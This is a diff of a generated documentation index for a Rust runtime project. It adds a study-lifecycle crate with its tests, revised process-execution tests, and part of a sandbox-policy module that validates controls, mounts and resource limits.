@@ -17,6 +17,7 @@ This generated lane consumes `docs/generated/sim-index-fragment.sx`. Global inde
 
 | Feature | Subject | Specimens | Summary |
 | --- | --- | ---: | --- |
+| `feature/sim-runtime/domain-free-study-lifecycle` | `crate/sim-lib-study` | 1 | Seal exact study coordinates and staged experimental designs, then plan, screen, confirm, claim, execute, retry, cancel, resume, verify, report, decide, select, export, and replay them through one evidence graph without owning domain, statistics, or executor effects. |
 | `feature/sim-runtime/javascript-core-profile` | `crate/sim-lib-lang-javascript` | 4 | Run embedded, capability-scoped ECMAScript over SIM values with one authoritative finite work budget, ordinary objects, exact UTF-16 strings, explicit drain-to-empty jobs, and JavaScript-named constructors for shared source-module and dynamic-source policies, with no private authority envelopes, Node, DOM, timers, ambient host IO, or implicit event loop. |
 | `feature/sim-runtime/typescript-notation-profile` | `crate/sim-lib-lang-typescript` | 1 | TypeScript notation; does not type-check. Load admitted notation by direct JavaScript erasure while retaining faithful, non-enforcing Shape metadata and explicit compiler gaps. |
 | `feature/sim-runtime/typed-lazy-typeclass-dictionaries` | `crate/sim-lib-lang-typed-lazy` | 1 | Represent a typeclass instance as an explicit language-owned evidence record mapping required method names to implementation symbols. |
@@ -45,6 +46,7 @@ This generated lane consumes `docs/generated/sim-index-fragment.sx`. Global inde
 | `feature/sim-runtime/python-object-control-policy` | `crate/sim-lib-lang-python` | 2 | Compose Python classes, C3, descriptors, bound methods, super, checked exceptions, context cleanup, generators, coroutines, and cyclic collection over shared runtime organs. |
 | `feature/sim-runtime/python-authorized-library-core` | `crate/sim-lib-lang-python` | 1 | Run embedded, capability-scoped, agent-authored Python over SIM values with ordered matching, supplied-root modules, and diminished eval/exec. |
 | `feature/sim-runtime/host-exec` | `crate/sim-lib-exec` | 1 | Expose bounded process policy through a capability-gated platform port outside the kernel. |
+| `feature/sim-runtime/sandbox-exec` | `crate/sim-lib-exec` | 1 | Validate complete requested controls and require launcher evidence before an untrusted process result can be accepted. |
 | `feature/sim-runtime/contract-emitter` | `crate/xtask` | 0 | Emit generated repository contract and index fragments for runtime crates. |
 | `feature/sim-runtime/guest-host-service-boundary` | `repo/sim-runtime` | 0 | Keep guest OS, source, import, native, and process surfaces behind explicit capabilities, supplied configuration, loader authority, and platform ports. |
 | `feature/sim-runtime/jvm-loadable-profile` | `crate/sim-lib-lang-jvm` | 9 | Decode caller-authorized classfile bytes and execute caller-selected exact class, member, descriptor, and integer arguments with distinct value, throwable, and refusal outcomes, plus bounded managed objects, arrays, exact Java text, and bidirectional functional-interface adapters through one host-registered library. |
@@ -54,6 +56,7 @@ This generated lane consumes `docs/generated/sim-index-fragment.sx`. Global inde
 
 | Surface | Kind | Subject |
 | --- | --- | --- |
+| `cli/study` | `cli` | `crate/sim-lib-study` |
 | `cli/xtask` | `cli` | `crate/xtask` |
 | `docs/sim-runtime/generated` | `docs` | `doc-set/sim-runtime/generated` |
 
@@ -274,6 +277,7 @@ This generated lane consumes `docs/generated/sim-index-fragment.sx`. Global inde
 - `crates/sim-lib-namespace/recipes/01-basics/namespace-ops/source-loading-authority.md`
 - `crates/sim-lib-namespace/recipes/book.toml`
 - `crates/sim-lib-operation-gate/recipes/01-basics/chapter.toml`
+- `crates/sim-lib-operation-gate/recipes/01-basics/two-manifests/.gitignore`
 - `crates/sim-lib-operation-gate/recipes/01-basics/two-manifests/Cargo.lock`
 - `crates/sim-lib-operation-gate/recipes/01-basics/two-manifests/Cargo.toml`
 - `crates/sim-lib-operation-gate/recipes/01-basics/two-manifests/README.md`
@@ -300,8 +304,340 @@ This generated lane consumes `docs/generated/sim-index-fragment.sx`. Global inde
 - `crates/sim-lib-standard-core/recipes/01-basics/profile-fidelity/recipe.toml`
 - `crates/sim-lib-standard-core/recipes/01-basics/profile-fidelity/setup.siml`
 - `crates/sim-lib-standard-core/recipes/book.toml`
+- `crates/sim-lib-study/recipes/README.md`
+- `crates/sim-lib-study/recipes/book.toml`
+- `crates/sim-lib-study/recipes/complete-a-study.md`
 
 ## Worked Examples
+
+### `feature/sim-runtime/domain-free-study-lifecycle`
+
+Specimen `spec-test/sim-runtime/crates/sim-lib-study/src/tests` is checked by `cargo test`.
+
+Source `crates/sim-lib-study/src/tests.rs`:
+
+```rust
+use super::*;
+use sim_lib_journal::MemoryBackend;
+use std::sync::atomic::{AtomicBool, Ordering};
+
+fn id(name: &str) -> ContentId {
+    ContentId::from_bytes(Symbol::qualified("test", name), Sha256::digest(name).into())
+}
+fn fixture(samples: u32, attempts: u32) -> (SealedStudy, RequiredClosure) {
+    let closure = RequiredClosure {
+        task: id("task"),
+        harness: id("harness"),
+        request: id("request"),
+        grader: id("grader"),
+    };
+    let selectors = Selectors {
+        subjects: vec![SubjectRevision::new(id("subject"))],
+        tasks: vec![closure.task.clone()],
+        harnesses: vec![closure.harness.clone()],
+        requests: vec![closure.request.clone()],
+        treatments: vec![id("treatment")],
+        samples,
+    };
+    let coordinates = expand(&selectors, &BTreeSet::new(), 20).unwrap();
+    let policy = SealPolicy::from_parsed_invocation(
+        id("selection"),
+        SourceAssertion {
+            revision: id("source"),
+            clean: true,
+        },
+        StudyBounds {
+            max_coordinates: 20,
+            max_attempts_per_coordinate: attempts,
+        },
+        &Datum::Node {
+            tag: Symbol::qualified("test", "invocation"),
+            fields: vec![],
+        },
+        closure.clone(),
+    )
+    .unwrap();
+    (SealedStudy::new(coordinates, policy).unwrap(), closure)
+}
+
+struct Resolver(RequiredClosure);
+impl ClosureResolver for Resolver {
+    fn resolve(&self, _: &StudyCoordinate) -> Result<RequiredClosure, LifecycleError> {
+        Ok(self.0.clone())
+    }
+}
+struct Cancel(AtomicBool);
+impl Cancel {
+    fn no() -> Self {
+        Self(AtomicBool::new(false))
+    }
+}
+impl Cancellation for Cancel {
+    fn is_cancelled(&self) -> bool {
+        self.0.load(Ordering::SeqCst)
+    }
+}
+
+struct Fake {
+    outcome: AttemptOutcome,
+    retry_once: bool,
+    calls: usize,
+    stale: bool,
+    cancel_during: Option<Arc<AtomicBool>>,
+    cancelled: usize,
+    closure: RequiredClosure,
+}
+impl StudyExecutor for Fake {
+    fn execute(
+        &mut self,
+        coordinate: &StudyCoordinate,
+        claim: &ContentId,
+        _: &dyn Cancellation,
+    ) -> AttemptEvidence {
+        self.calls += 1;
+        if let Some(flag) = &self.cancel_during {
+            flag.store(true, Ordering::SeqCst);
+        }
+        AttemptEvidence {
+            coordinate: coordinate.content_id().unwrap(),
+            claim: if self.stale {
+                id("stale-claim")
+            } else {
+                claim.clone()
+            },
+            closure: self.closure.clone(),
+            outcome: self.outcome,
+            objects: vec![b"typed evidence".to_vec()],
+            retryable: self.retry_once && self.calls == 1,
+        }
+    }
+    fn cancel(&mut self, _: &ContentId) {
+        self.cancelled += 1;
+    }
+}
+
+#[test]
+fn offline_expansion_uses_missing_indexes_below_n() {
+    let (study, _) = fixture(3, 2);
+    let terminal = BTreeSet::from([study
+        .coordinates
+        .iter()
+        .find(|coordinate| coordinate.sample_index() == 1)
+        .unwrap()
+        .content_id()
+        .unwrap()]);
+    let selectors = Selectors {
+        subjects: vec![study.coordinates[0].subject().clone()],
+        tasks: vec![study.coordinates[0].task().clone()],
+        harnesses: vec![study.coordinates[0].harness().clone()],
+        requests: vec![study.coordinates[0].request().clone()],
+        treatments: vec![study.coordinates[0].treatment().clone()],
+        samples: 3,
+    };
+    let expanded = expand(&selectors, &terminal, 3).unwrap();
+    let mut indexes = expanded
+        .iter()
+        .map(StudyCoordinate::sample_index)
+        .collect::<Vec<_>>();
+    indexes.sort_unstable();
+    assert_eq!(indexes, vec![0, 2]);
+}
+
+#[test]
+fn fake_executor_completes_and_projection_is_byte_identical_on_replay() {
+    let (study, closure) = fixture(2, 2);
+    let mut lifecycle = StudyLifecycle::new(MemoryBackend::new());
+    lifecycle.install(&study).unwrap();
+    let resolver = Resolver(closure.clone());
+    let cancel = Cancel::no();
+    let mut executor = Fake {
+        outcome: AttemptOutcome::Observed,
+        retry_once: false,
+        calls: 0,
+        stale: false,
+        cancel_during: None,
+        cancelled: 0,
+        closure,
+    };
+    while lifecycle
+        .run_one(&study, &resolver, &mut executor, &cancel)
+        .unwrap()
+    {}
+    let first = lifecycle.projection(&study.id).unwrap();
+    let second = lifecycle.projection(&study.id).unwrap();
+    assert!(first.is_complete());
+    assert_eq!(executor.calls, 2);
+    assert_eq!(first.canonical_bytes(), second.canonical_bytes());
+}
+
+#[test]
+fn retry_is_append_only_and_never_duplicates_terminal_coordinate() {
+    let (study, closure) = fixture(1, 3);
+    let mut lifecycle = StudyLifecycle::new(MemoryBackend::new());
+    lifecycle.install(&study).unwrap();
+    let resolver = Resolver(closure.clone());
+    let cancel = Cancel::no();
+    let mut executor = Fake {
+        outcome: AttemptOutcome::Observed,
+        retry_once: true,
+        calls: 0,
+        stale: false,
+        cancel_during: None,
+        cancelled: 0,
+        closure,
+    };
+    assert!(
+        lifecycle
+            .run_one(&study, &resolver, &mut executor, &cancel)
+            .unwrap()
+    );
+    assert!(
+        lifecycle
+            .run_one(&study, &resolver, &mut executor, &cancel)
+            .unwrap()
+    );
+    assert!(
+        !lifecycle
+            .run_one(&study, &resolver, &mut executor, &cancel)
+            .unwrap()
+    );
+    let item = lifecycle
+        .projection(&study.id)
+        .unwrap()
+        .coordinates
+        .into_values()
+        .next()
+        .unwrap();
+    assert_eq!(item.attempts.len(), 2);
+    assert_eq!(item.state, CoordinateState::Observed);
+    assert_eq!(executor.calls, 2);
+}
+
+#[test]
+fn stale_reply_is_discarded_and_retried_without_scoring_missing_work() {
+    let (study, closure) = fixture(1, 3);
+    let mut lifecycle = StudyLifecycle::new(MemoryBackend::new());
+    lifecycle.install(&study).unwrap();
+    let resolver = Resolver(closure.clone());
+    let cancel = Cancel::no();
+    let mut executor = Fake {
+        outcome: AttemptOutcome::Observed,
+        retry_once: false,
+        calls: 0,
+        stale: true,
+        cancel_during: None,
+        cancelled: 0,
+        closure: closure.clone(),
+    };
+    lifecycle
+        .run_one(&study, &resolver, &mut executor, &cancel)
+        .unwrap();
+    executor.stale = false;
+    lifecycle
+        .run_one(&study, &resolver, &mut executor, &cancel)
+        .unwrap();
+    let item = lifecycle
+        .projection(&study.id)
+        .unwrap()
+        .coordinates
+        .into_values()
+        .next()
+        .unwrap();
+    assert!(item.attempts[0].discarded);
+    assert!(!item.attempts[1].discarded);
+    assert_eq!(item.state, CoordinateState::Observed);
+}
+
+#[test]
+fn cancellation_interrupts_releases_fence_and_explicit_resume_takes_over() {
+    let (study, closure) = fixture(1, 3);
+    let mut lifecycle = StudyLifecycle::new(MemoryBackend::new());
+    lifecycle.install(&study).unwrap();
+    let flag = Arc::new(AtomicBool::new(false));
+    struct SharedCancel(Arc<AtomicBool>);
+    impl Cancellation for SharedCancel {
+        fn is_cancelled(&self) -> bool {
+            self.0.load(Ordering::SeqCst)
+        }
+    }
+    let cancel = SharedCancel(flag.clone());
+    let resolver = Resolver(closure.clone());
+    let mut executor = Fake {
+        outcome: AttemptOutcome::Observed,
+        retry_once: false,
+        calls: 0,
+        stale: false,
+        cancel_during: Some(flag.clone()),
+        cancelled: 0,
+        closure: closure.clone(),
+    };
+    lifecycle
+        .run_one(&study, &resolver, &mut executor, &cancel)
+        .unwrap();
+    assert_eq!(executor.cancelled, 1);
+    assert_eq!(
+        lifecycle
+            .projection(&study.id)
+            .unwrap()
+            .coordinates
+            .values()
+            .next()
+            .unwrap()
+            .state,
+        CoordinateState::Pending
+    );
+    flag.store(false, Ordering::SeqCst);
+    lifecycle.resume().unwrap();
+    executor.cancel_during = None;
+    lifecycle
+        .run_one(&study, &resolver, &mut executor, &cancel)
+        .unwrap();
+    let item = lifecycle
+        .projection(&study.id)
+        .unwrap()
+        .coordinates
+        .into_values()
+        .next()
+        .unwrap();
+    assert_eq!(item.attempts.len(), 2);
+    assert!(item.attempts[0].interrupted);
+    assert_eq!(item.state, CoordinateState::Observed);
+}
+
+#[test]
+fn closure_drift_quarantines_before_executor_and_terminal_admission() {
+    let (study, closure) = fixture(1, 2);
+    let mut lifecycle = StudyLifecycle::new(MemoryBackend::new());
+    lifecycle.install(&study).unwrap();
+    let mut drift = closure.clone();
+    drift.grader = id("different-grader");
+    let mut executor = Fake {
+        outcome: AttemptOutcome::Observed,
+        retry_once: false,
+        calls: 0,
+        stale: false,
+        cancel_during: None,
+        cancelled: 0,
+        closure,
+    };
+    lifecycle
+        .run_one(&study, &Resolver(drift), &mut executor, &Cancel::no())
+        .unwrap();
+    assert_eq!(executor.calls, 0);
+    assert_eq!(
+        lifecycle
+            .projection(&study.id)
+            .unwrap()
+            .coordinates
+            .values()
+            .next()
+            .unwrap()
+            .state,
+        CoordinateState::Quarantined
+    );
+}
+// conformance: study tests prove lifecycle execution, retries, replay, and evidence closure.
+```
 
 ### `feature/sim-runtime/javascript-core-profile`
 
@@ -804,7 +1140,11 @@ use crate::{
 };
 
 fn cx_with_number_tower() -> Cx {
-    let mut cx = Cx::new(Arc::new(EagerPolicy), Arc::new(DefaultFactory));
+    let mut cx = Cx::new(
+        Arc::new(EagerPolicy),
+        Arc::new(DefaultFactory),
+        sim_kernel::HandleSeed::new(0xe5e8_7c41_68ed_e4c8),
+    );
     cx.load_lib(&sim_lib_numbers_arith::NumbersArithmeticLib::new())
         .unwrap();
     cx.load_lib(&sim_lib_numbers_i64::I64NumbersLib::new())
@@ -900,7 +1240,11 @@ fn is_widens_overflowing_integer_terms_through_number_tower() {
 
 #[test]
 fn findall_collects_answers_forced_from_sequence_engine() {
-    let mut cx = Cx::new(Arc::new(EagerPolicy), Arc::new(DefaultFactory));
+    let mut cx = Cx::new(
+        Arc::new(EagerPolicy),
+        Arc::new(DefaultFactory),
+        sim_kernel::HandleSeed::new(0x67fb_0420_d419_d05c),
+    );
     let db = color_db();
     let config = LogicConfig::default();
     let forced = Arc::new(AtomicUsize::new(0));
@@ -942,7 +1286,11 @@ fn findall_collects_answers_forced_from_sequence_engine() {
 
 #[test]
 fn findall_query_projects_answer_template() {
-    let mut cx = Cx::new(Arc::new(EagerPolicy), Arc::new(DefaultFactory));
+    let mut cx = Cx::new(
+        Arc::new(EagerPolicy),
+        Arc::new(DefaultFactory),
+        sim_kernel::HandleSeed::new(0xc023_60c8_a87b_fab4),
+    );
     let answers = query_all(
         &mut cx,
         &color_db(),
@@ -1689,6 +2037,7 @@ Source `crates/sim-lib-class/recipes/01-basics/neutral-class/recipe.toml`:
 ```toml
 id = "neutral-class"
 title = "Classes for a language that does not exist yet"
+purpose = "Exercise language-neutral class lineage, Shape, caching, and construction."
 summary = "Exercise lineage, failures, managed caching, Shape browsing, and read construction without a guest runtime."
 tags = ["class", "language-neutral", "lineage", "managed", "shape", "read-construction"]
 ```
@@ -6072,6 +6421,7 @@ Source `crates/sim-lib-function/recipes/01-basics/neutral-language/recipe.toml`:
 ```toml
 id = "neutral-language"
 title = "A function for a language that does not exist yet"
+purpose = "Compose language-neutral function policy, capture, arguments, and dispatch."
 summary = "Compose typed body policy, lexical capture, arguments, browsing, collection, and dispatch."
 tags = ["function", "language-neutral", "managed", "dispatch", "sandbox-descriptor"]
 ```
@@ -6601,7 +6951,11 @@ fn binding_live_claims_match_loaded_exports() {
 fn let_special_form_binds_parallel_in_child_scope() {
     use sim_kernel::{DefaultFactory, EagerPolicy};
 
-    let mut cx = Cx::new(Arc::new(EagerPolicy), Arc::new(DefaultFactory));
+    let mut cx = Cx::new(
+        Arc::new(EagerPolicy),
+        Arc::new(DefaultFactory),
+        sim_kernel::HandleSeed::new(0xe845_ab74_f06c_8ff2),
+    );
     install_binding_lib(&mut cx).unwrap();
 
     let sym = |name: &str| Expr::Symbol(Symbol::new(name));
@@ -11738,7 +12092,11 @@ fn binding_badge_symbol() -> Symbol {
 }
 
 fn test_cx() -> Cx {
-    Cx::new(Arc::new(NoopEvalPolicy), Arc::new(DefaultFactory))
+    Cx::new(
+        Arc::new(NoopEvalPolicy),
+        Arc::new(DefaultFactory),
+        sim_kernel::HandleSeed::new(0x8a93_90c8_d1d3_33e3),
+    )
 }
 
 fn table_value<'a>(expr: &'a Expr, key: &str) -> Option<&'a Expr> {
@@ -11898,6 +12256,7 @@ fn datum_display(datum: &Datum) -> String {
 fn term_display(term: &Term) -> String {
     format!("term:{term:?}")
 }
+// conformance: Scheme conformance tests prove language semantics and runtime boundaries.
 ```
 
 ### `feature/sim-runtime/guest-language-profiles`
@@ -12127,6 +12486,7 @@ mod tests {
         }));
     }
 }
+// conformance: Lua conformance tests prove language semantics and runtime boundaries.
 ```
 
 Specimen `spec-test/sim-runtime/crates/sim-lib-lang-lua/src/lib` is checked by `cargo test`.
@@ -13493,45 +13853,48 @@ Source `crates/sim-lib-exec/src/tests.rs`:
 ```rust
 use crate::*;
 use sim_kernel::{Error, Expr, Symbol, testing::bare_cx};
-use std::{path::PathBuf, sync::Mutex};
-
-// conformance: process policy is checked before an injected platform port runs.
+use std::sync::Mutex;
 
 #[derive(Default)]
 struct RecordingPort {
     requests: Mutex<Vec<ProcessRequest>>,
-    outcome: Mutex<Option<std::result::Result<ProcessReceipt, ProcessError>>>,
+    outcome: Mutex<Option<ProcessAttempt>>,
 }
 impl ProcessPort for RecordingPort {
-    fn run(
-        &self,
-        request: &ProcessRequest,
-        _: &ProcessCancellation,
-    ) -> std::result::Result<ProcessReceipt, ProcessError> {
+    fn run(&self, request: &ProcessRequest, _: &ProcessCancellation) -> ProcessAttempt {
         self.requests.lock().unwrap().push(request.clone());
-        self.outcome.lock().unwrap().take().unwrap_or_else(|| {
-            Ok(ProcessReceipt {
-                provider: "model".into(),
-                elapsed_mono_ns: 7,
-                result: ProcResult {
-                    stdout: "out".into(),
-                    stderr: String::new(),
-                    exit_code: 0,
-                    truncated: false,
+        self.outcome
+            .lock()
+            .unwrap()
+            .take()
+            .unwrap_or_else(|| ProcessAttempt::Completed {
+                receipt: ProcessReceipt {
+                    provider: "model".into(),
+                    elapsed_mono_ns: 7,
+                    result: ProcResult {
+                        stdout: "out".into(),
+                        stderr: String::new(),
+                        exit_code: 0,
+                        truncated: false,
+                    },
                 },
             })
-        })
     }
 }
 fn options() -> ExecOptions {
-    ExecOptions::new(PathBuf::from("/sandbox"), 100, 16)
+    ExecOptions::new(
+        ProgramRef::new("printf").unwrap(),
+        ProjectRootRef::new("project").unwrap(),
+        100,
+        16,
+    )
 }
 fn argv() -> Vec<String> {
-    vec!["printf".into(), "hello world".into()]
+    vec!["hello world".into()]
 }
 
 #[test]
-fn capability_and_policy_precede_port_dispatch() {
+fn capability_and_policy_precede_dispatch() {
     let port = RecordingPort::default();
     let mut cx = bare_cx();
     let denied = exec(
@@ -13542,95 +13905,121 @@ fn capability_and_policy_precede_port_dispatch() {
         &ProcessCancellation::default(),
     )
     .unwrap_err();
-    assert!(
-        matches!(denied, Error::CapabilityDenied { capability } if capability == exec_capability())
-    );
-    assert!(port.requests.lock().unwrap().is_empty());
+    assert!(matches!(denied,Error::CapabilityDenied{capability} if capability==exec_capability()));
     cx.grant(exec_capability());
-    for (args, opts) in [
-        (vec![], options()),
-        (argv(), ExecOptions::new("/sandbox", 0, 16)),
-        (argv(), ExecOptions::new("/sandbox", 1, 0)),
-        (argv(), ExecOptions::new("relative", 1, 1)),
-    ] {
+    for mut opts in [options(), options()] {
+        if opts.budget.timeout_ms == 100 {
+            opts.budget.timeout_ms = 0
+        } else {
+            opts.budget.max_output_bytes = 0
+        }
         assert!(
             exec(
                 &mut cx,
                 &port,
-                &args,
+                &argv(),
                 &opts,
                 &ProcessCancellation::default()
             )
             .is_err()
-        );
+        )
     }
-    assert!(port.requests.lock().unwrap().is_empty());
+    assert!(port.requests.lock().unwrap().is_empty())
 }
 
 #[test]
-fn checked_request_is_structured_bounded_rooted_and_environment_diminished() {
+fn request_is_opaque_whole_atom_and_empty_by_default() {
     let port = RecordingPort::default();
     let mut cx = bare_cx();
     cx.grant(exec_capability());
-    let opts = options()
-        .with_cwd("/sandbox/work")
-        .with_stdin(b"input".to_vec())
-        .with_env("LANG", "C");
-    let result = exec(
+    exec(
         &mut cx,
         &port,
         &argv(),
-        &opts,
+        &options().with_stdin(b"input".to_vec()),
         &ProcessCancellation::default(),
     )
     .unwrap();
-    assert_eq!(result.stdout, "out");
     let requests = port.requests.lock().unwrap();
     let request = &requests[0];
-    assert_eq!(request.argv, argv());
-    assert_eq!(request.root, PathBuf::from("/sandbox"));
-    assert_eq!(request.cwd, PathBuf::from("/sandbox/work"));
-    assert_eq!(request.environment.len(), 1);
-    assert_eq!(request.environment["LANG"], "C");
+    assert_eq!(request.program.as_str(), "printf");
+    assert_eq!(request.root.as_str(), "project");
+    assert_eq!(request.argv[0].as_str(), "hello world");
+    assert_eq!(request.environment.iter().count(), 0)
 }
 
 #[test]
-fn timeout_cancellation_kill_failure_and_leak_evidence_are_preserved() {
-    for (outcome, words) in [
+fn sealed_bindings_validate_names_nul_duplicates_bounds_and_kinds() {
+    assert!(
+        SealedBindings::try_from_entries([("BAD=NAME".into(), BindingValue::Literal("x".into()))])
+            .is_err()
+    );
+    assert!(SealedBindings::literals([("A".into(), "x\0y".into())]).is_err());
+    assert!(
+        SealedBindings::try_from_entries([
+            ("A".into(), BindingValue::Literal("1".into())),
+            ("A".into(), BindingValue::Literal("2".into()))
+        ])
+        .is_err()
+    );
+    let huge = "x".repeat(65 * 1024);
+    assert!(SealedBindings::literals([("A".into(), huge)]).is_err());
+    let bindings = SealedBindings::try_from_entries([
         (
-            ProcessError::Timeout {
-                kill_failure: Some("denied".into()),
-                leaked_descendants: true,
-            },
-            ["timed out", "kill failed", "leaked"],
+            "ROOT".into(),
+            BindingValue::ProjectRoot(ProjectRootRef::new("project").unwrap()),
         ),
         (
-            ProcessError::Cancelled {
-                kill_failure: None,
-                leaked_descendants: false,
-            },
-            ["cancelled", "", ""],
+            "SECRET".into(),
+            BindingValue::PrivateArtifact(PrivateArtifactRef::new("token").unwrap()),
         ),
-    ] {
-        let port = RecordingPort {
-            requests: Mutex::default(),
-            outcome: Mutex::new(Some(Err(outcome))),
-        };
-        let mut cx = bare_cx();
-        cx.grant(exec_capability());
-        let message = exec(
-            &mut cx,
-            &port,
-            &argv(),
-            &options(),
-            &ProcessCancellation::default(),
-        )
-        .unwrap_err()
-        .to_string();
-        for word in words.into_iter().filter(|word| !word.is_empty()) {
-            assert!(message.contains(word));
-        }
-    }
+    ])
+    .unwrap();
+    assert_eq!(bindings.iter().count(), 2)
+}
+
+#[test]
+fn only_not_dispatched_is_retryable() {
+    let attempts = [
+        ProcessAttempt::NotDispatched {
+            refusal: ProcessRefusal::SpawnFailed("missing".into()),
+        },
+        ProcessAttempt::Completed {
+            receipt: ProcessReceipt {
+                provider: "m".into(),
+                elapsed_mono_ns: 0,
+                result: ProcResult {
+                    stdout: String::new(),
+                    stderr: String::new(),
+                    exit_code: 7,
+                    truncated: false,
+                },
+            },
+        },
+        ProcessAttempt::StoppedAfterTimeout {
+            receipt: StopReceipt {
+                provider: "m".into(),
+                elapsed_mono_ns: 1,
+                cleanup: "reaped".into(),
+            },
+        },
+        ProcessAttempt::StoppedAfterCancel {
+            receipt: StopReceipt {
+                provider: "m".into(),
+                elapsed_mono_ns: 1,
+                cleanup: "reaped".into(),
+            },
+        },
+        ProcessAttempt::UnknownAfterDispatch {
+            evidence: DispatchEvidence {
+                provider: "m".into(),
+                stage: "reap".into(),
+                detail: "unknown".into(),
+            },
+        },
+    ];
+    assert!(attempts[0].automatically_retryable());
+    assert!(attempts[1..].iter().all(|v| !v.automatically_retryable()))
 }
 
 #[test]
@@ -13638,9 +14027,8 @@ fn cancellation_token_is_shareable() {
     let token = ProcessCancellation::default();
     let other = token.clone();
     token.cancel();
-    assert!(other.is_cancelled());
+    assert!(other.is_cancelled())
 }
-
 #[test]
 fn proc_result_encodes_constructor_form() {
     let result = ProcResult {
@@ -13650,25 +14038,570 @@ fn proc_result_encodes_constructor_form() {
         truncated: true,
     };
     let Expr::Call { operator, args } = result.to_constructor_expr() else {
-        panic!("expected constructor")
+        panic!()
     };
     assert_eq!(*operator, Expr::Symbol(Symbol::new("ProcResult")));
-    assert_eq!(args[3], Expr::Bool(true));
+    assert_eq!(args[3], Expr::Bool(true))
 }
-
 #[test]
-fn runtime_contains_no_concrete_process_mechanics() {
+fn portable_crate_contains_no_host_binding() {
     let source = include_str!("exec.rs");
     for forbidden in [
+        "PathBuf",
+        "std::path",
         "std::process",
-        "Command::new",
+        "std::env",
         "Instant::now",
-        "current_dir",
-        "process_group",
+        "Command::new",
     ] {
-        assert!(!source.contains(forbidden), "runtime retained {forbidden}");
+        assert!(!source.contains(forbidden), "runtime retained {forbidden}")
     }
 }
+// conformance: execution tests prove bounded launch, cancellation, and retained evidence.
+```
+
+### `feature/sim-runtime/sandbox-exec`
+
+Specimen `spec-test/sim-runtime/crates/sim-lib-exec/src/sandbox` is checked by `cargo test`.
+
+Source `crates/sim-lib-exec/src/sandbox.rs`:
+
+```rust
+use crate::{ArgAtom, ProcessCancellation, ProgramRef, SealedBindings};
+use sim_kernel::{Error, Result};
+use std::{
+    collections::{BTreeMap, BTreeSet},
+    sync::Arc,
+};
+
+const MAX_MOUNTS: usize = 64;
+const MAX_STDIN: usize = 16 * 1024 * 1024;
+
+/// One independently provable sandbox control.
+#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
+pub enum SandboxControl {
+    /// Network namespace and interfaces.
+    Network,
+    /// Visible filesystem mounts.
+    Mounts,
+    /// Filesystem root and working root.
+    Root,
+    /// Child process environment.
+    Environment,
+    /// Host user and session identity.
+    Identity,
+    /// CPU time.
+    Cpu,
+    /// Address-space memory.
+    Memory,
+    /// Monotonic wall time.
+    WallTime,
+    /// Descendant process count.
+    ProcessCount,
+    /// Created file count.
+    FileCount,
+    /// Created file bytes.
+    FileBytes,
+    /// Captured output bytes.
+    Output,
+    /// Standard-input bytes.
+    Stdin,
+    /// Descendant cleanup.
+    ProcessTree,
+}
+
+/// Whether absence of a control is fatal or may be reported as unavailable.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum SandboxRequirement {
+    /// Refuse before execution when the launcher cannot prove this control.
+    Required,
+    /// Execute when possible and report whether this control was achieved.
+    BestEffort,
+}
+
+/// Access granted to a declared mount.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum MountAccess {
+    /// Input visible without mutation authority.
+    ReadOnly,
+    /// Explicit output root.
+    Writable,
+}
+
+/// Opaque boot-resolved source mounted at a fixed absolute guest path.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SandboxMount {
+    /// Opaque boot-authorized source identity.
+    pub source: String,
+    /// Absolute path inside the anonymous sandbox root.
+    pub guest_path: String,
+    /// Requested access.
+    pub access: MountAccess,
+}
+
+/// Complete bounded resource policy. Zero is invalid for every limit.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SandboxLimits {
+    /// CPU seconds.
+    pub cpu_seconds: u64,
+    /// Address-space bytes.
+    pub memory_bytes: u64,
+    /// Monotonic milliseconds.
+    pub wall_time_ms: u64,
+    /// Maximum process count.
+    pub process_count: u64,
+    /// Maximum files across writable roots.
+    pub file_count: u64,
+    /// Maximum bytes across writable roots.
+    pub file_bytes: u64,
+    /// Shared stdout and stderr cap.
+    pub output_bytes: usize,
+    /// Standard-input cap.
+    pub stdin_bytes: usize,
+}
+
+/// Validated portable sandbox policy, independent of any OS launcher.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SandboxPolicy {
+    requirements: BTreeMap<SandboxControl, SandboxRequirement>,
+    mounts: Vec<SandboxMount>,
+    limits: SandboxLimits,
+}
+impl SandboxPolicy {
+    /// Validates a complete control classification, mount set, and limit set.
+    pub fn new(
+        requirements: impl IntoIterator<Item = (SandboxControl, SandboxRequirement)>,
+        mounts: Vec<SandboxMount>,
+        limits: SandboxLimits,
+    ) -> Result<Self> {
+        let requirements = requirements.into_iter().collect::<BTreeMap<_, _>>();
+        let all = [
+            SandboxControl::Network,
+            SandboxControl::Mounts,
+            SandboxControl::Root,
+            SandboxControl::Environment,
+            SandboxControl::Identity,
+            SandboxControl::Cpu,
+            SandboxControl::Memory,
+            SandboxControl::WallTime,
+            SandboxControl::ProcessCount,
+            SandboxControl::FileCount,
+            SandboxControl::FileBytes,
+            SandboxControl::Output,
+            SandboxControl::Stdin,
+            SandboxControl::ProcessTree,
+        ];
+        if all.iter().any(|c| !requirements.contains_key(c)) {
+            return Err(Error::Eval(
+                "sandbox policy must classify every control".into(),
+            ));
+        }
+        if mounts.len() > MAX_MOUNTS {
+            return Err(Error::Eval("too many sandbox mounts".into()));
+        }
+        let mut guests = BTreeSet::new();
+        for mount in &mounts {
+            if mount.source.is_empty()
+                || !mount.guest_path.starts_with('/')
+                || mount.guest_path.contains("..")
+                || mount.guest_path.contains('\0')
+                || !guests.insert(&mount.guest_path)
+            {
+                return Err(Error::Eval("invalid or duplicate sandbox mount".into()));
+            }
+        }
+        if limits.cpu_seconds == 0
+            || limits.memory_bytes == 0
+            || limits.wall_time_ms == 0
+            || limits.process_count == 0
+            || limits.file_count == 0
+            || limits.file_bytes == 0
+            || limits.output_bytes == 0
+            || limits.stdin_bytes == 0
+            || limits.stdin_bytes > MAX_STDIN
+        {
+            return Err(Error::Eval(
+                "sandbox limits must be non-zero and bounded".into(),
+            ));
+        }
+        Ok(Self {
+            requirements,
+            mounts,
+            limits,
+        })
+    }
+    /// Returns the complete requested-control map.
+    pub fn requirements(&self) -> &BTreeMap<SandboxControl, SandboxRequirement> {
+        &self.requirements
+    }
+    /// Returns declared mounts only.
+    pub fn mounts(&self) -> &[SandboxMount] {
+        &self.mounts
+    }
+    /// Returns the validated resource limits.
